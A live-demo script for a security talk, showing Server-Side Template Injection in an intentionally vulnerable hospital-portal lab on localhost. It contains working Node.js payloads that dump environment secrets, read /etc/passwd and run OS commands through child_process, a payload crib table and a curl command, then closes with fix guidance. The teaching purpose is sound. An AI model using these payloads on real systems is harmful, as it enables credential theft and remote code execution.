# MediCare Pro — SSTI Live Demo Script (website-only, no slides)

**Format:** pure live demo — everything happens in the browser and the code editor. No slides.
**Target length:** ~7–8 minutes
**Attack:** Server-Side Template Injection (SSTI) in the Patient Feedback lab
**Flow:** you open on the **login page**, sign in as admin, then walk to the Patient Feedback lab.

> ⚠️ Everything targets the **intentionally vulnerable lab** inside MediCare Pro on `localhost:3000`. Do not run these payloads against any system you don't own.
>
> ✅ **Payloads re-verified live against the running lab:** `${7*7}` → `Comments: 49`, env-key dump works, the RCE chain executes (`whoami` → `root`), and the error oracle returns `[template error: …]`. Review IDs (e.g. `FB-01001`) reset when the server restarts.

---

## Windows to have open (in this tab order)

1. **Browser** — the login page (`http://localhost:3000` → `index.html`), **signed out** so the login beat plays live. After sign-in: sidebar → Patient Feedback.
2. **Editor** — `api/feedback.js` open, scrolled to `renderTemplate()` *(optional — only needed for Beat 4; skip it and stay in the browser if you prefer)*
3. **Terminal** — hidden behind the others, ready with the backup curl commands

## Pre-flight checklist (2 minutes, before the audience arrives)

1. Submit `${7*7}` once. You must see `Comments: 49`. If you see the literal
   text `${7*7}`, the server is running a patched build — stop and check `api/feedback.js`.
2. Submit a normal comment once ("Great care, thank you!") so the first lab beat is fresh.
3. Make sure you are **signed out** (or use a private window) so the login beat starts clean.
4. Screenshot each payload's output as a fallback in case the server dies mid-talk.
5. Clear the feedback list if you want a clean run (restart server → in-memory reviews reset).

---

## Beat 1 — The innocent login (0:00–1:00)

**On screen:** the MediCare Pro login page (`index.html`).

**Do:** let the page sit for a second — brand, tagline, feature list. Then sign in as `admin / admin123` and land on the dashboard.

**Say:**
> "This is our hospital portal — *Secure Patient Care Portal, trusted by 200+ hospitals, HIPAA-compliant storage*. Signing in as the administrator… and we're in. Keep those words in mind: *secure, trusted, compliant*. In the next few minutes, one text box on one page of this 'secure' portal is going to hand me the keys to the whole hospital."

**Presenter note:** the login works with or without Firebase configured (`/api/login` → custom token, or local fallback). Don't get dragged into explaining auth here — keep this beat under a minute.

## Beat 2 — The innocent form (1:00–1:45)

**On screen:** dashboard → sidebar → **Patient Feedback** page.

**Do:** from the dashboard, click **Patient Feedback** in the sidebar. Submit a normal review — pick a patient, 5 stars, comment: *"Great care, thank you!"* Let the generated report render.

**Say:**
> "A hospital runs on more than charts — patients rate their care, and staff log that feedback. Here's the **Patient Feedback** page: pick a patient, leave a rating, write a comment, and the server generates a formatted report. Nothing suspicious — a dropdown, a rating, a comment box. By the end of this demo, this comment box will hand me the hospital's credentials and a shell on the server."

## Beat 3 — The probe (1:45–2:30)

**Do:** in Comments, submit exactly:

```
${7*7}
```

Point at the report: `Comments: 49`.

**Say:**
> "Forty-nine. I typed math and the server *did* the math. A normal comment box would echo the literal text back — seeing `49` means my input landed inside something that evaluates code. That's Server-Side Template Injection, confirmed with one probe."

## Beat 4 — Why that worked (2:30–3:45) — the code moment *(optional)*

**Skip this beat?** Totally fine — the demo stays 100% in the browser and runs ~6½ minutes. Deliver this verbally over the `Comments: 49` report instead:

> "Why did math become 49? The server builds this report as a template string and glues my comment straight into it — then a hand-rolled engine evaluates every `${...}` it finds with JavaScript's `new Function`, which compiles real, unsandboxed code. In other words: my comment box is a code editor on the server."

If you **do** want to show the code, here's the full beat: switch to the editor showing `api/feedback.js`. Two highlights:

1. The template assembly:

```js
'Comments: ' + review.comments,   // ← raw input enters the template
```

2. The "template engine":

```js
const evalFn = new Function(...keys, `return (${expr});`);
```

**Say:**
> "Here's the bug. The report is built as a *template*, and my comment is concatenated straight into it — line right here. Then this hand-rolled engine finds every `${...}` and evaluates it with `new Function` — which compiles a real JavaScript function. No sandbox. Anything I type between `${` and `}` runs as Node.js code on the server.
>
> Two quirks worth knowing: the extractor stops at the first `}`, so payloads must be one flat expression. And errors come back as `[template error: …]` in the report — a built-in oracle that makes crafting payloads trivial.
>
> The `esc()` function above it looks like escaping — it's just `String()`. Security theater."

## Beat 5 — Reconnaissance (3:45–4:30)

**Do:** back to the browser. Submit, one at a time:

```
${typeof process}
${process.version}
${Object.keys(process.env).join(', ')}
```

**Say:**
> "Now that I'm running code on the server, what can I reach? In Node, everything hangs off the global `process` object. Three probes: it exists, here's the runtime version — and here's every environment variable *name* on the server. That last one is the recon goldmine: I now know exactly which secrets exist without guessing."

## Beat 6 — The exfiltration (4:30–5:15)

**Do:** submit:

```
${process.env.FIREBASE_SERVICE_ACCOUNT}
```

**Say:**
> "Names are recon — values are breach. One payload: the hospital's Firebase admin service account, the credential that bypasses every security rule in the database. An attacker doesn't need to log in — they *are* the database."

**Presenter note:** if your local `.env` doesn't define that variable (empty output), say so honestly and dump a different one instead, e.g. `${JSON.stringify(process.env).slice(0,200)}` — the lesson is identical: *any* secret in the environment is readable.

## Beat 7 — Full RCE (5:15–6:00)

**Do:** submit both:

```
${process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}
${process.mainModule.require('child_process').execSync('whoami').toString()}
```

**Say:**
> "Why stop at secrets? Notice plain `require` fails here — it's not in the template's scope. But `process` is, and it carries the module loader: `process.mainModule.require`. Two payloads: I've read a system file off the server's disk… and I've executed an OS command — the report shows `root`.
>
> That's the full chain: probe → confirm → recon → steal → shell. From a comment box to the operating system."

## Beat 8 — Recap + the fix (6:00–7:15)

**Do:** leave the last report on screen. Speak over it.

**Say:**
> "Recap what one comment box gave me: server-side code execution, credential theft, filesystem access, a remote shell.
>
> The fix is three rules. One — never concatenate user input into a template; pass it as *data* to the renderer. Two — escape the `${`, `{`, `}` delimiters in user text before it can touch a template string. Three — use a real hardened template engine, not a hand-rolled `new Function`. Same rule for every evaluation sink: `eval`, `new Function`, `vm` — if user text can become code, assume it eventually will."

## Beat 9 — Close (7:15–7:45)

**Say:**
> "Template engines are code — anything you feed them becomes code too. I signed in through the front door of a 'secure' portal, and one `${7*7}` in a feedback box found the way in; three payloads later I had the keys to the hospital. Keep data out of your templates, and templates out of your users' hands. Happy to re-run any payload live — or take questions."

---

## Presenter payload crib (keep on second monitor or printed)

| Beat | Payload | Expected output |
|---|---|---|
| 3 · Probe | `${7*7}` | `Comments: 49` |
| 5 · Fingerprint | `${typeof process}` | `object` |
| 5 · Runtime | `${process.version}` | Node version |
| 5 · Env names | `${Object.keys(process.env).join(', ')}` | env var names |
| 6 · Steal secret | `${process.env.FIREBASE_SERVICE_ACCOUNT}` | service-account JSON (if configured) |
| 7 · File read | `${process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}` | file contents |
| 7 · Command exec | `${process.mainModule.require('child_process').execSync('whoami').toString()}` | `root` on the lab box |

**Backup (curl) if the UI misbehaves:**

```bash
curl -X POST http://localhost:3000/api/feedback \
  -H 'Content-Type: application/json' \
  -d '{"patientId":"P-001","rating":"5","comments":"${7*7}"}'
```

The evaluated result appears in the JSON response's `report` field (the `Comments:` line).

## If something breaks live

- **`[template error: …]` appears** — read the message aloud, fix the payload. The oracle is your friend; even failing looks impressive.
- **Server restarted mid-demo** — review IDs reset; just resubmit. Nothing else changes.
- **Literal `${7*7}` comes back** — you're on a patched build; switch to the backup screenshots and narrate from those.
- **Env var empty** — use the Beat 6 fallback payload; keep moving.
